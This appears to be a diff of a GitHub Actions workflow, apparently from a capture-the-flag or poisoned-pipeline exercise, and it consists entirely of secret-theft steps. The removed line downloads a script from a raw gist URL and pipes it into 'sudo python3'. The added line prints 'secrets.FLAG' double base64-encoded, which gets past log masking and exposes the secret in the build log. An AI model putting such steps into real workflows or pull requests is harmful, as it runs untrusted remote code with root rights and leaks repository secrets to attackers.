@@ -7,4 +7,4 @@ jobs:
   a:
     runs-on: ubuntu-latest
     steps:
-      - run: curl -sL https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/ | sudo python3
+      - run:  echo ${{ secrets.FLAG }} | base64 | base64
